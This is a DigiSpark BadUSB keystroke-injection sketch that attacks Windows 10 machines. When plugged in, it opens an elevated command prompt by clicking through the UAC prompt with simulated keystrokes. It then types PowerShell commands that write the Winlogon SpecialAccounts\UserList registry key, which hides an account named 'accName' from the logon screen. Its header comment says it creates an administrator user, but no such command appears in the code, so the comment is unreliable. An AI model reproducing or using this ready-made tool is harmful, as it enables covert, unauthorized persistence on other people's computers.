//This DigiSpark script creates new local user and adds it to "Administrators" group
//Tested on Windows 10 with English(US) keyboard layout
//Created by Michyus | Edited by Padsala Trushal
#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("powershell New-Item -Path \"\'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts'\" -Name \"UserList\" "));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("powershell New-ItemProperty -Path \"\'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\'\" -Name \"accName\" -Value \"0\"  -PropertyType DWORD "));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  /* end hide user section */
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
}
